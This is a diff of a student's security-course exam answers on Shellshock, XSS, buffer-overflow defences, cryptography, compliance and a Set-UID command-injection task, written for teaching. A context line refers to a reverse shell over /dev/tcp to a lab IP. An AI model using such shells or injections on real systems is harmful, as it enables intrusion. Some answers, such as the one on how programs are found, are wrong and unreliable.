@@ -15,7 +15,7 @@ Those citations will be listed below the entire task itself via a link and in a 
 
 ### Task 1.1
 
-```Both system() and execve() can be used to execute external programs. Why is system() considered to be unsafe while execve() is considered to be safe?```
+> Both system() and execve() can be used to execute external programs. Why is system() considered to be unsafe while execve() is considered to be safe?
 
 `system()` is considered unsafe because it does not support code isolation. This means that an attacker could insert a new command or something malicious into the a a command input which could lead to some unwanted effects.
 
@@ -23,7 +23,7 @@ Those citations will be listed below the entire task itself via a link and in a 
 
 ### Task 1.2
 
-```For the Shellshock vulnerability to be exploitable, two conditions need to be satisfied. What are these two conditions?```
+> For the Shellshock vulnerability to be exploitable, two conditions need to be satisfied. What are these two conditions?
 
 1) you should be able to run bash 2) must be able to obtain an enviornmental variable from the outside. 
 
@@ -43,20 +43,20 @@ Machine 2 wil connect to Machine 1 using the `/dev/tcp/10.0.2.6/7070` part of th
 
 
 ### Task 1.4
-```What is ASLR and why does ASLR make buffer-overflow attacks more difficult?```
+> What is ASLR and why does ASLR make buffer-overflow attacks more difficult?
 
 ASLR stands for Address Space Layout Randomization. ASLR randomies the memory addresses of both an executable and the positions of a stack/heap/libraries. This makes it hard for attackers to guess the location of maliciously injected code. 
 
 ### Task 1.5
 
-```What is the underlying cause for XSS vulnerabilities?```
+> What is the underlying cause for XSS vulnerabilities?
 
 The underlying cause for XSS vulnerabilities is that HTML allows JS code to be mixed with data. According to the book, when the code & data show up, the HTML parser in the browser separates the code from the data but it doesn't understand what came from where - so it just executes the code. 
 
 
 ### Task 1.6
 
-```What is the difference between reflected XSS and stored XSS?```
+> What is the difference between reflected XSS and stored XSS?
 
 A reflected or non-persistent XSS is like when the user inputs "cute penguin photos" into Google and then Google spits out something that might say "No results for cute penguin photos". However, if the query is not reflected correctly, then it may have an XSS vulnerability. Attacks can then put JS code into the user input so when you reflect the user input back, the JS code will also be run and attach itself to the user's browser and infect the computer. 
 
@@ -66,35 +66,35 @@ Chapter 11 in Computer and Internet Security was a big help in finding this answ
 
 ### Task 1.7
 
-```In the Diffie-Hellman key exchange, Alice sends g^x mod p to Bob, and Bob sends g^y mod to p to Alice. How do they get a common secret?```
+> In the Diffie-Hellman key exchange, Alice sends g^x mod p to Bob, and Bob sends g^y mod to p to Alice. How do they get a common secret?
 
 So, Alice and Bob both pick random positive integers less than p. Alice picks x < p and bob picks y < p. And then Alice sends `A = g^x mod p` to Bob. Bob sends `B =  g^y mod p` to Alice. Alice then computes `K = B^x mod p` which is just `(g^y mod p)^x mod p`. Bob computes `B^1 = A^y mod p` which is just (g^x mod p)^y mod p. Now after doing this, they get the same secret using the rules of math - `g^(xy) mod p`. An on-looker might be able to get all the pieces but because an on-looker will never known the numbers that Bob/Alice picked (x/y) an onlooker wouldn't be able to compute g^xy.
 
 Page 532 of the Computer and Internet Security book was a major help in finding this answer. 
 
 ### Task 1.8
-```Why do we use hybrid encryption? Why don’t we simply use public key cryptography to encrypt everything?```
+
+> Why do we use hybrid encryption? Why don’t we simply use public key cryptography to encrypt everything?
 
 We use hybrid encryption because public key cryptography has a high computation cost. We don't always know how large the file that we're encrypting is going to be, so if we have a lot of data, we could have this ridiculously hard public-key computation cost that we need to make. 
 
 ### Task 1.9
 
-```
-(Part 1) When you run programs at the command line (e.g., ls, cat, top) or link to libraries (e.g., libc), 
-how are these programs/libraries found?
-```
+> (Part 1) When you run programs at the command line (e.g., ls, cat, top) or link to libraries (e.g., libc), 
+> How are these programs/libraries found?
+
 
 The programs/libraries are found because they're connected to a public network (bin) that holds all the files that are associated with that command. 
 
-```
-(Part 2) What is a potential risk of using this approach to find programs/libraries?
-```
+> (Part 2) What is a potential risk of using this approach to find programs/libraries?
+
+
 These are some very public files that can be seen and edited by anyone. As a result, if someone wanted to, you could easily inject something malicious into those files that would be run every time you typed in `ls`. As someone who never remembers what they name anything or where anything's stored, this would be very dangerous for me. 
 
 
 ### Task 1.10
 
-```Identify at least three countermeasures to buffer-overflow attacks and briefly describe how they work.```
+> Identify at least three countermeasures to buffer-overflow attacks and briefly describe how they work.
 
 I used the book for this one. 
 
@@ -108,9 +108,10 @@ I used the book for this one.
 
 ### Task 2.1
 
-```Please recall our class on 4/20 with a guest visit from Ryan Darnell. During this class we discussed a real-world scenario where you needed to design a feature that used an assortment of ideas we’ve learned about from cryptography to protect project files. Your primary objectives were to (1) securely store sensitive project data, while (2) trying to minimize overhead and data loss (e.g., due to partial file corruption).```
+> Please recall our class on 4/20 with a guest visit from Ryan Darnell. During this class we discussed a real-world scenario where you needed to design a feature that used an 
+> assortment of ideas we’ve learned about from cryptography to protect project files. Your primary objectives were to (1) securely store sensitive project data, while (2) trying > to minimize overhead and data loss (e.g., due to partial file corruption).```
 
-```Please write a brief summary of the approach you settled on, the pros/cons, and any potential challenges or issues with your approach.```
+> Please write a brief summary of the approach you settled on, the pros/cons, and any potential challenges or issues with your approach.
 
 CBC - No, because of the block chaining and because we might access this a lot - we have a decent chunk get corrupted. 
 
@@ -139,19 +140,19 @@ I don't know why the formatting for the opening quesiton is so off, my bad. I tr
 
 ### Task 2.2
 
-```In your own words, what is compliance and why is compliance important?```
+> In your own words, what is compliance and why is compliance important?
 
 Compliance is making sure that existing policies are being followed and companies are meeting whatever security guidelines that are applicable to them. 
 
 
-```What is a compliance framework?```
+> What is a compliance framework?
 
 Compliance framework is a bunch of rules and set structures of guidelines/rules that a company needs to follow to ensure they're meeting the regulartory requirements. 
 
 > Thank you Reese's slides
 
 
-```Please provide three (3) examples of a compliance rule/test, and briefly explain why this check could be helpful towards ensuring compliance?```
+> Please provide three (3) examples of a compliance rule/test, and briefly explain why this check could be helpful towards ensuring compliance?
 
 
 1) STIG-16811: The designer will ensure the application does not have cross site scripting (XSS) vulnerabilities.
@@ -171,15 +172,15 @@ This check will be helpful towards ensuring compliance because it helps prevent 
 
 ### Task 3.1
 
-`Please read the source code for audit.c and, at a high level, describe what this program does and how it works.`
+> Please read the source code for audit.c and, at a high level, describe what this program does and how it works.
 
 
 This program asks the the user to enter a file name in the command line and then it will run the `bin/cat` command to display the contents of whatever file name was entered. However, using `system(command)` the user can delete any file that they want. 
 
 ### Task 3.2
 
-`With our understanding of audit.c from the previous task, please demonstrate how it can be exploited to run an arbitrary command with elevated privileges.`
-`For your demonstration, you’ll need to compile audit.c and make the resulting executable a privileged Set-UID program.`
+> With our understanding of audit.c from the previous task, please demonstrate how it can be exploited to run an arbitrary command with elevated privileges.
+> For your demonstration, you’ll need to compile audit.c and make the resulting executable a privileged Set-UID program.
 
 ![image](https://github.com/znorden17/csci-476-594-spring2021-private/blob/main/final/screenshots/task3.2.png)
 
